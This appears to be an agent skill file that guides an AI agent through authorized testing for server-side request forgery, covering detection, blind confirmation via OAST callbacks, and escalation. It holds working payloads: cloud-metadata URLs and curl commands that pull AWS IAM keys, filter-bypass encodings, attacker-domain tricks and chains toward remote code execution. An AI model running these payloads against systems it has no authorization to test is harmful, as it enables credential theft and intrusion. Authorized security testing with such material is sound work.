---
name: ssrf
description: "Server-Side Request Forgery — coerce the server to request internal/cloud targets. Use when a param takes a url/uri/callback/webhook/redirect/image-fetch/proxy value, or a feature does link previews, remote fetches, PDF/screenshot generation. Signals: 169.254.169.254 metadata, RFC1918, localhost, blind via OAST."
---

# SSRF (Server-Side Request Forgery)

> **Prereq — map first:** Don't test this cold. A target attack-surface map and the relevant happy-flow baseline must exist first — run `/recon-mapper` if not. Test this class against the impact-scored candidate list (highest priority first), reuse the routed `handoff_context`, and pursue chains to real business impact over isolated low-severity bugs.


Coerce the server into making requests to a location the attacker chooses — its own loopback, internal back-end systems, or cloud metadata. Impact comes from what the request *reaches*, not the callback itself.

## When to test
Any feature where the server fetches a URL on your behalf:
- Webhooks / callback URLs / notification endpoints
- Link previews, URL unfurling, oEmbed
- Image / file / avatar import "from URL"
- PDF / screenshot / thumbnail / preview generators (often headless browser = strong vector)
- Document/feed/XML import (RSS, SAML, XXE-to-SSRF)
- Integration connectors (Slack, Zapier-style), proxy/fetch endpoints
- Hidden surface: partial URLs (host/path params joined server-side), `Referer` header parsed by analytics, URLs embedded in data formats.

## Impact & priority — be honest
- **P1/P2 (high signal):** cloud metadata credential theft (IAM keys, tokens), reaching an internal admin panel that performs actions, internal data exfil, SSRF that chains to RCE (e.g. internal Redis/Memcached, gopher, unauth internal services).
- **P3/lower:** SSRF that reaches internal hosts but returns nothing useful; port-scan-only.
- **Often noise:** pure blind SSRF — a DNS/HTTP callback with NO demonstrated internal reach. A collaborator ping alone is not impact.

## Reality check FIRST — is the server-side fetch even real? (kills the #1 false positive)
Many "status check / URL validator / health / connectivity" endpoints **never make a network request** — they echo a canned `{"status":"OK"}` (or "reachable") for *any* input. Confirming SSRF on an inert stub is the fetch-oracle twin of the canned-`200` trap. **Before any SSRF claim, run a reachability differential** and require the response (or timing) to actually *track* what you point it at:
- Point it at (a) a **reachable** host/port, (b) a **definitely-unreachable** host (`nonexistent-zzz-99999.invalid`), (c) a **closed/unrouteable** target (`10.255.255.1`, a closed loopback port). 
- **Real fetch:** status/body/timing **differs** across these (e.g. unreachable → DOWN/error/timeout, reachable → OK fast). **Inert stub:** *uniform* OK + *flat* timing across all three → **NOT SSRF, discard.**
- Only once the endpoint demonstrably reacts to reachability do the OAST/internal probes below mean anything.

## Detection
1. Point the param at an OAST/collaborator host. A hit confirms the server makes the request. **DNS-only hit (no HTTP)** = outbound HTTP likely filtered, still SSRF.
2. Point at `http://127.0.0.1/`, `http://localhost/admin`, `http://[::1]/` — look for response differences, internal content, or admin pages.
3. Point at cloud metadata `http://169.254.169.254/` — any 200/redirect/timing change is promising.
4. Sweep RFC1918 (`http://192.168.0.0/24`, `10.x`, `172.16–31.x`) — diff response length/timing to map live internal hosts.

### Blind confirmation — OAST is the default
No response shown? Confirm out-of-band, not by feel. An OAST callback (DNS+HTTP) is jitter-immune binary proof; time-delay is the **fallback only**.
- **Default:** get a callback host, point the param at it, watch for a DNS or HTTP hit.
  ```bash
  ~/go/bin/interactsh-client -v   # prints a live <id>.oast.* domain; logs each DNS/HTTP hit
  # zero-install fallback: use a public oast.fun / oast.pro host
  ```
  Then `?url=http://<id>.oast.fun/` — DNS hit alone (no HTTP) = outbound HTTP filtered, still SSRF.
- **Fallback (no egress):** response/timing diff. Time-delay is unreliable alone — pair every TRUE probe (e.g. internal host that hangs) with a **zero-delay control** (an instantly-refused/closed port) and repeat **3×**. Report only if all 3 TRUE probes are slow **and** all 3 control probes are fast.

## Exploitation
- **Server itself:** `http://localhost/admin`, `http://127.0.0.1/admin` — trust relationships often skip auth for loopback. Trigger an admin action via the SSRF if proving impact.
- **Back-end systems:** internal IPs/hostnames not externally routable; read internal-only endpoints, admin consoles, dashboards.
- **Cloud metadata (read creds/tokens):**
  - AWS: `http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>` (IMDSv2 needs a token header).
  - GCP: `http://metadata.google.internal/computeMetadata/v1/` + header `Metadata-Flavor: Google`.
  - Azure: `http://169.254.169.254/metadata/instance?api-version=2021-02-01` + header `Metadata: true`.
- **Blind SSRF (no response shown):** confirm via the OAST default above, then escalate — probe internal ranges with OAST payloads to map hosts, hit known-vulnerable internal services, or feed a malicious response to exploit a client-side parser (path to RCE).

## Common bypasses
When filters block internal targets, evade them (defense evasion only — stay in scope):
- Alt IP encodings: decimal `2130706433`, octal `017700000001`, hex `0x7f000001`, short `127.1`, `0.0.0.0`.
- IPv6: `[::1]`, `[::ffff:127.0.0.1]`, IPv6 of internal host.
- DNS rebinding / attacker domain resolving to `127.0.0.1` or an internal IP.
- Open-redirect chaining: whitelisted host with a redirect param pointing internal.
- Whitelist tricks: `@` creds `https://expected-host@evil`, fragment `https://evil#expected-host`, subdomain `https://expected-host.evil`, double URL encoding.
- Protocol switch (`http`↔`https`), case variation, URL-encode blocked strings.
See `reference.md` for the full payload catalog.

## Minimal PoC (log to ./_EXPLOIT/)
Demonstrate internal reach with a single curl. Cloud-metadata example:
```bash
# Vulnerable: 'url' param fetched server-side; coerce it to read AWS IAM creds
curl -s 'https://target.example/api/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/' 
# -> returns role name, then:
curl -s 'https://target.example/api/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>'
# -> response body contains AccessKeyId / SecretAccessKey / Token  == proven impact
```
Internal-admin example: `?url=http://localhost/admin` returning the admin page body. Save the request + the returned internal/sensitive data to `./_EXPLOIT/`.

## Chain for impact
SSRF is rarely the end state — escalate it:
- **SSRF → cloud metadata → credential theft → privilege escalation/RCE** (stay within authorization; prove access, don't pivot beyond scope).
- **SSRF reaching an internal service** → feed the internal surface to `/access-control-idor` (internal admin) or the relevant injection skill.
- **Open redirect → SSRF filter bypass**, and **SSRF → `/request-smuggling`** front-end abuse.
- A blind OAST hit alone is weak; chain it to something internal before reporting via `/reporting`.

## Don't report as noise
A blind OAST hit with no demonstrated internal access is low value. Before reporting, show *what it reaches*: returned metadata creds, internal admin/dashboard content, an internal host you mapped, or a concrete chain. No reachable target → not a P1.

## Deep reference
See `reference.md` for full payloads, per-cloud metadata paths, OAST workflow, and defense-circumvention catalog. Sources:
- https://portswigger.net/web-security/ssrf
- https://portswigger.net/web-security/ssrf/blind
